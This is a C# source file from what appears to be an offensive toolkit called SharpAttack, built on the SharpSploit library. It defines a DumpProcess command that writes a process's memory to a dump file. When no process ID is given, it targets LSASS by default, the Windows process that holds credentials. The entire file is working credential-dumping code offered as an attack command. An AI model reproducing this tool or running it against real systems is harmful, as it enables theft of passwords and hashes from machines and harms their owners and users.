using System;
using System.Collections.Generic;
using SharpSploit.Enumeration;

namespace SharpAttack.Commands
{
  class DumpProcess : Command
  {

    public override void Run(Dictionary<String, Parameter> RunParams)
    {
      int id = -1;
      string OutputPath = null;
      string OutputName = null;

      if (RunParams.TryGetValue("PID", out Parameter pid))
      {
        id = int.Parse(pid.Value[0]);
      }

      if (RunParams.TryGetValue("OutputPath", out Parameter outpath))
      {
        OutputPath = outpath.Value[0];
      }

      if (RunParams.TryGetValue("OutputName", out Parameter outname))
      {
        OutputName = outname.Value[0];
      }

      if (id < 0)
      {
        Host.CreateProcessDump("lsass", OutputPath, OutputName);
      }
      else
      {
        Host.CreateProcessDump(id, OutputPath, OutputName);
      }
    }

    public DumpProcess()
    {
      Name = "DumpProcess";
      Helptext = "Dumps the memory of a given process";
      Parameters.Add("PID", new Parameter("ID of the process to dump. Defaults to LSASS", 0));
      Parameters.Add("OutputPath", new Parameter("The path to save the dump. Defaults to current directory", 1));
      Parameters.Add("OutputName", new Parameter("Name to save the dump as. Defaults to <processname>_<pid>.dmp", 2));
      Register();
    }
  }
}
